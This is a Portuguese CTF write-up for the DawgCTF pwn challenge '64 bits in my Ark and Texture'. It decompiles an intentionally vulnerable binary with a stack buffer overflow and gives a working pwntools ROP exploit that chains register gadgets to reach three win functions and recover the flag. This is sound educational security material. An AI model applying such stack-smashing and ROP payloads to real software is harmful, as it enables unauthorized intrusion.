# WriteUp: 64 bits in my Ark and Texture
## Descrição do Desafio:
**Categoria:** pwn \
**Descrição:**
> Can you pwn it? No libc or system needed. Just good ol, 64 bit binary exploitation.

### Arquivos
| Arquivo | Descrição |
| ------- | --------- |
| 64bits | Executável. |
| solve.py | Script. |

> 📥 **Download:** [Arquivos](https://github.com/HawkSecUnifei/Writeups/raw/refs/heads/main/2025/DawgCTF/64-bits-in-my-Ark-and-Texture/64bits)

## Passo a Passo da Solução
### 1. Análise do arquivo fornecido
O desafio nos fornece apenas um executável. Ao executá-lo, o programa apresenta a seguinte interface:

```bash
=========== Welcome to the Exploitation Dojo ==============
You must first prove your knowledge if you want access to my secrets
Question 1: In an x86-64 Linux architecture, a function reads its arguments from the stack, left-to-right. True or False?
[1] True
[2] False
> 2
Correct!
Question 2: In an x86-64 Linux architecture, which register holds the first integer or pointer argument to a function?
[1] RDI
[2] RSI
[3] RAX
[4] RCX
> 1
Correct!
Question 3: In an x86-64 Linux architecture, where is the return value of a function typically stored?
[1] RDX
[2] RSP
[3] RBP
[4] RAX
> 4
Correct!
You may have passed my test but I must see you display your knowledge before you can access my secrets
Lesson 1: For your first challenge you have to simply jump to the function at this address: 0x401401
```

Inicialmente é nos apresentado 3 perguntas simples, e após responder elas, o código pede para retornarmos para o endereço `0x401401`. Analisando essa função pelo Ghidra, vemos que é bem isso mesmo, ele nos informa o endereço da função `win1()` (que sempre será o mesmo pela falta da proteção **PIE**) e fornece um meio de estourarmos a pilha.

{% code title="main.c" overflow="wrap" lineNumbers="true" %}

```c
undefined8 main(void)

{
  int iVar1;
  undefined8 uVar2;
  char local_98 [16];
  undefined *local_88;
  undefined *local_80;
  undefined *local_78;
  undefined *local_70;
  undefined *local_68;
  undefined *local_60;
  undefined *local_58;
  undefined *local_50;
  undefined *local_48;
  char *local_40;
  undefined *local_38;
  char *local_30;
  undefined *local_28;
  char *local_20;
  undefined *local_18;
  char *local_10;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("=========== Welcome to the Exploitation Dojo ==============");
  puts("You must first prove your knowledge if you want access to my secrets");
  local_10 = 
  "Question 1: In an x86-64 Linux architecture, a function reads its arguments from the stack, left- to-right. True or False?"
  ;
  local_48 = &DAT_00402412;
  local_40 = "False";
  local_18 = &DAT_0040241d;
  iVar1 = askQuestion("Question 1: In an x86-64 Linux architecture, a function reads its arguments f rom the stack, left-to-right. True or False?"
                      ,&local_48,2,&DAT_0040241d);
  if (iVar1 == 0) {
    uVar2 = 0xffffffff;
  }
  else {
    local_20 = 
    "Question 2: In an x86-64 Linux architecture, which register holds the first integer or pointer argument to a function?"
    ;
    local_68 = &DAT_00402497;
    local_60 = &DAT_0040249b;
    local_58 = &DAT_0040249f;
    local_50 = &DAT_004024a3;
    local_28 = &DAT_004024a7;
    iVar1 = askQuestion("Question 2: In an x86-64 Linux architecture, which register holds the first  integer or pointer argument to a function?"
                        ,&local_68,4,&DAT_004024a7);
    if (iVar1 == 0) {
      uVar2 = 0xffffffff;
    }
    else {
      local_30 = 
      "Question 3: In an x86-64 Linux architecture, where is the return value of a function typicall y stored?"
      ;
      local_88 = &DAT_00402517;
      local_80 = &DAT_0040251b;
      local_78 = &DAT_0040251f;
      local_70 = &DAT_0040249f;
      local_38 = &DAT_00402523;
      iVar1 = askQuestion("Question 3: In an x86-64 Linux architecture, where is the return value of  a function typically stored?"
                          ,&local_88,4,&DAT_00402523);
      if (iVar1 == 0) {
        uVar2 = 0xffffffff;
      }
      else {
        puts(
            "You may have passed my test but I must see you display your knowledge before you can ac cess my secrets"
            );
        printf("Lesson 1: For your first challenge you have to simply jump to the function at this a ddress: %p\n"
               ,win1);
        local_98[0] = '\0';
        local_98[1] = '\0';
        local_98[2] = '\0';
        local_98[3] = '\0';
        local_98[4] = '\0';
        local_98[5] = '\0';
        local_98[6] = '\0';
        local_98[7] = '\0';
        local_98[8] = '\0';
        local_98[9] = '\0';
        local_98[10] = '\0';
        local_98[0xb] = '\0';
        local_98[0xc] = '\0';
        local_98[0xd] = '\0';
        local_98[0xe] = '\0';
        local_98[0xf] = '\0';
        fgets(local_98,0x200,stdin);
        uVar2 = 0;
      }
    }
  }
  return uVar2;
}
```

{% endcode %}

Olhando pelo GDB, a quantidade de *bytes* necessários para chegar no endereço de retorno é `0x98`. Analisando a função `win1()`, vemos que o objetivo é o mesmo, porém agora devemos pular para a `win2()` passando como parâmetro o valor `0xDEADBEEF`.

Para isso iremos precisar de um *gadget* `pop rdi`, que é fornecido no código. 

{% code title="win1.c" overflow="wrap" lineNumbers="true" %}

```c
undefined8 win1(void)

{
  int iVar1;
  undefined8 uVar2;
  char local_28 [23];
  char local_11;
  FILE *local_10;
  
  puts("You have passed the first challenge. The next one won\'t be so simple.");
  printf("Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning . Bring the artifact of 0xDEADBEEF to the temple of %p to claim your advance."
         ,win2);
  local_10 = fopen("flag1.txt","r");
  if (local_10 == (FILE *)0x0) {
    perror("Error opening file");
    uVar2 = 1;
  }
  else {
    while( true ) {
      iVar1 = fgetc(local_10);
      local_11 = (char)iVar1;
      if (local_11 == -1) break;
      putchar((int)local_11);
    }
    fclose(local_10);
    local_28[0] = '\0';
    local_28[1] = '\0';
    local_28[2] = '\0';
    local_28[3] = '\0';
    local_28[4] = '\0';
    local_28[5] = '\0';
    local_28[6] = '\0';
    local_28[7] = '\0';
    local_28[8] = '\0';
    local_28[9] = '\0';
    local_28[10] = '\0';
    local_28[0xb] = '\0';
    local_28[0xc] = '\0';
    local_28[0xd] = '\0';
    local_28[0xe] = '\0';
    local_28[0xf] = '\0';
    puts("Continue: ");
    fgets(local_28,0x60,stdin);
    uVar2 = 0;
  }
  return uVar2;
}

```

{% endcode %}

Não tem muito segredo agora, a `win2()` verifica se o parâmetro está correto e pede para pularmos para a `win3()` passando 3 parâmetros (cujos *gadgets* necessários são fornecidos no código). 

{% hint style="warning" %}

**Importante:** Todas as funções `win` imprimem um pedaço da *flag*.

{% endhint %}

### 2. Exploit
O *exploit* é simples, devemos apenas realizar um **ROP**, nos preocupando em pegar os pedaços da *flag*.

{% code title="solve.py" overflow="wrap" lineNumbers="true" %}

```py
# 64 bits in my Ark and Texture
# Can you pwn it? No libc or system needed. Just good ol, 64 bit binary exploitation.

from pwn import *

elf = context.binary = ELF("./64bits")
#p = process()
p = remote("ip", porta)

#gdb.attach(p)
#input("PAUSE: ")

# Respondendo as questões.
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"4")

# Retornando para a win1.
payload = b"A" * 0x98 + p64(0x401400) + p64(elf.sym["win1"])
p.recvuntil(b"address")
p.sendlineafter(b"\n", payload)

# Recuperando a flag1.
p.recvuntil(b"advance.")
flag1 = p.recvuntil(b"Continue", drop=True).decode()
print(flag1)

# Retornando para a win2.
payload = b"A" * 0x28 + p64(elf.sym["pop_rdi_ret"]) + p64(0xdeadbeef) + p64(0x401400) + p64(elf.sym["win2"])
p.sendline(payload)

# Recuperando a DEADBEEF
p.recvuntil(b"I believe in you")
deadbeef = p.recvuntil(b"Final ", drop=True).decode()
print(deadbeef)

# Retornnando para a win3
payload = b"A" * 0x38 + p64(elf.sym["pop_rdi_ret"]) + p64(0xdeadbeef) + p64(elf.sym["pop_rsi_ret"]) + p64(0xdeafface) + p64(elf.sym["pop_rdx_ret"]) + p64(0xfeedcafe) + p64(0x401400) +p64(elf.sym["win3"])
p.sendline(payload) 

# Recuperando o resto.
p.recvuntil(b"reward\n")
rest = p.recvall().decode()
print(rest)

#input("PAUSE: ")
# DawgCTF{C0ngR4tul4t10ns_d15c1p13_y0u_4r3_r34dy_2_pwn!}
```

{% endcode %}

Com isso obtemos o seguinte resultado:

```bash
Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
[+] Opening connection to connect.umbccd.net on port 22237: Done
DawgCTF{C0ngR4tul4t10ns_


d15c1p13_y0u_

[+] Receiving all data: Done (19B)
[*] Closed connection to connect.umbccd.net port 22237

4r3_r34dy_2_pwn!}
```

{% hint style="warning" %}

**Importante:** atente-se ao alinhamento da pilha, em *exploits* de **ROP** muitas vezes acabamos deixando a pilha desalinhada (no caso, ela não está alinhada em 16 *bytes*, fazendo com que os endereços não terminem todos em 0). Para resolvermos isso de forma simples, podemos colocar um simples *gadget* de `RET` antes do endereço de retorno. Na solução, todos os *payloads* estão com a instrução `p64(0x401400)` antes do endereço de retorno real.

{% endhint %}

### Flag
`DawgCTF{C0ngR4tul4t10ns_d15c1p13_y0u_4r3_r34dy_2_pwn!}`

## Autor da WriteUp
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)